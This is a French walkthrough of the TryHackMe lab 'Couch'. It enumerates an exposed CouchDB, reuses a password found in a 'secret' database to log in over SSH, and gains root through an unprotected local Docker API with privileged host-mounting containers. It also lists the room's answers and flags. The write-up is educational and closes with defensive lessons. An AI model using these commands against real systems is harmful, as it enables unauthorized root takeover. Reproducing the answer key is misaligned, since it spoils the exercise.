# TryHackMe: Couch

**Objectif :** enumerer une instance CouchDB exposee, extraire des identifiants reutilisables depuis la base, compromettre la machine en SSH, puis elever les privileges en abusant d'une API Docker locale mal protegee.

---

## Introduction

La room **Couch** est un bon exercice sur deux points bien distincts :

- l'exploration d'une base NoSQL accessible via HTTP
- la compromission totale d'un systeme Linux a cause d'une mauvaise exposition Docker

Le point d'entree n'est pas une RCE "classique". Ici, on commence par comprendre l'interface web de CouchDB et les endpoints natifs de l'application, ce qui rend la room particulierement pedagogique.

---

## Task 1: Resy Set Go

La room est semi-guidee et pose des questions precises. Je reprends donc chaque etape proprement.

### Question 1: Scan the machine. How many ports are open?

Je lance un scan Nmap standard :

```bash
nmap -sC -sV couch.thm
```

Je retrouve deux ports ouverts :

- `22/tcp` pour SSH
- `5984/tcp` pour CouchDB

### Reponse

**How many ports are open?** `2`

### Question 2: What is the database management system installed on the server?

La reponse apparait directement en consultant la page racine de l'application :

```bash
curl http://couch.thm:5984/
```

On recupere un JSON de bienvenue qui identifie le service comme **CouchDB**.

### Reponse

**Database management system:** `CouchDB`

### Question 3: What port is the database management system running on?

Le service repond sur :

```text
5984
```

### Reponse

**DBMS port:** `5984`

### Question 4: What is the version of the management system installed on the server?

Le JSON de la page d'accueil donne egalement la version :

```json
{"couchdb":"Welcome","version":"1.6.1",...}
```

### Reponse

**Version:** `1.6.1`

### Question 5: What is the path for the web administration tool for this database management system?

Pour CouchDB, l'interface d'administration accessible via navigateur est bien connue :

```text
/_utils
```

Je peux la verifier en ouvrant :

```bash
curl http://couch.thm:5984/_utils/
```

### Reponse

**Admin tool path:** `/_utils`

### Question 6: What is the path to list all databases in the web browser of the database management system?

La documentation officielle CouchDB confirme que l'endpoint serveur qui liste toutes les bases est :

```text
/_all_dbs
```

### Reponse

**Path to list all databases:** `/_all_dbs`

---

## Enumeration detaillee de CouchDB

La room repose sur une bonne comprehension de l'interface HTTP de CouchDB. Je commence par regarder la reponse de base :

```bash
curl http://couch.thm:5984/
```

Le serveur renvoie un objet JSON simple avec :

- le nom du produit
- la version
- des metadonnees de fournisseur

Ensuite, je liste les bases disponibles :

```bash
curl http://couch.thm:5984/_all_dbs
```

Ou, de facon plus confortable, j'ouvre l'interface Fauxton via :

```text
http://couch.thm:5984/_utils/
```

Cette etape fait apparaitre plusieurs bases et attire vite l'attention sur une base au nom explicite :

```text
secret
```

Cette base contient un document interessant avec un champ `passwordbackup`.

---

## Identification de la faille utile

Le probleme n'est pas une execution de code directe dans CouchDB. Le vrai risque ici est une mauvaise hygiene de stockage :

- une base sensible est accessible
- un document y contient un mot de passe sauvegarde
- cet identifiant est reutilise sur un autre service, ici SSH

En recuperant le document concerne, on tombe sur la valeur suivante :

```text
atena:t4qfzcc4qN##
```

Cette reutilisation de mot de passe est le pont entre l'application et le systeme.

---

## Exploitation: acces initial via SSH

Je teste les credentials trouves :

```bash
ssh atena@couch.thm
```

Le login reussit. J'obtiens donc un shell sur la machine en tant qu'utilisateur `atena`.

Dans le home de l'utilisateur :

```bash
cd /home/atena
ls -la
cat user.txt
```

### Reponse

**user.txt:** `THM{1ns3cure_couchdb}`

---

## Post-exploitation: recherche d'un vecteur de privilege escalation

Une fois sur la machine, je reprends une enumeration locale normale.

### Verification sudo

```bash
sudo -l
```

Rien d'exploitable immediatement.

### Recherche de services ou ports ecoutes localement

```bash
netstat -plnt
```

C'est ici que la room devient interessante. On observe un port local :

```text
127.0.0.1:2375
```

Ce port correspond a l'API Docker non TLS. Dans un contexte reel, c'est deja un drapeau rouge majeur.

### Observation de l'historique Bash

Cette piste ressort tres vite pendant l'enumeration locale :

```bash
cat ~/.bash_history
```

On y retrouve une commande cle deja utilisee sur la machine :

```bash
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
```

Autrement dit :

- l'API Docker locale accepte des commandes
- un conteneur privilegie peut etre lance
- le systeme de fichiers de l'hote peut etre monte

---

## Privilege Escalation: abus de l'API Docker

Je reutilise directement cette technique.

### Methode 1: monter l'hote dans `/mnt`

```bash
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
```

Une fois dans le conteneur, je peux parcourir le systeme de fichiers de l'hote via `/mnt` :

```bash
cd /mnt/root
cat root.txt
```

### Methode 2: chroot pour obtenir un shell root sur l'hote

Certaines sources utilisent une variante encore plus directe :

```bash
docker -H tcp://127.0.0.1:2375 run -it --rm -v /:/mnt alpine chroot /mnt sh
```

Cette seconde approche permet de se retrouver directement dans un shell qui "voit" l'hote comme racine.

Dans les deux cas, le resultat est le meme : acces root sur la machine.

### Reponse

**root.txt:** `THM{RCE_us1ng_Docker_API}`

---

## Resume des reponses de la room

- Scan the machine. How many ports are open? `2`
- What is the database management system installed on the server? `CouchDB`
- What port is the database management system running on? `5984`
- What is the version of the management system installed on the server? `1.6.1`
- What is the path for the web administration tool for this database management system? `/_utils`
- What is the path to list all databases in the web browser of the database management system? `/_all_dbs`
- Compromise the machine and locate user.txt `THM{1ns3cure_couchdb}`
- Escalate privileges and obtain root.txt `THM{RCE_us1ng_Docker_API}`

---

## Commandes cles et explications

### Identification du service

```bash
curl http://couch.thm:5984/
```

Retourne le message de bienvenue CouchDB et la version.

### Enumeration des bases

```bash
curl http://couch.thm:5984/_all_dbs
```

Permet de reperer la base `secret`.

### Connexion SSH

```bash
ssh atena@couch.thm
```

Teste la reutilisation du mot de passe recupere dans la base.

### Enumeration reseau locale

```bash
netstat -plnt
```

Met en evidence l'API Docker sur `127.0.0.1:2375`.

### Lecture de l'historique

```bash
cat ~/.bash_history
```

Fournit parfois la commande exacte a rejouer, ce qui est le cas ici.

### Conteneur privilegie

```bash
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
```

Monte le systeme de fichiers de l'hote dans le conteneur et casse toute isolation utile.

---

## Ce qu'il fallait retenir

Cette machine illustre tres bien deux erreurs frequentes :

1. stocker des credentials sensibles dans une base insuffisamment protegee
2. laisser accessible une API Docker capable de lancer des conteneurs privilegies

En pratique, la seconde erreur est devastatrice : toute personne qui peut parler a l'API Docker peut presque toujours devenir root.

---

## Conclusion

**Couch** est une room courte, mais tres instructive. Elle apprend a regarder au-dela du simple site web et a traiter une application comme un service expose avec ses propres endpoints natifs. Une fois le shell obtenu, la presence d'une API Docker locale transforme l'escalade en formalite.

***Auteur*** *: Saad Idrissi*
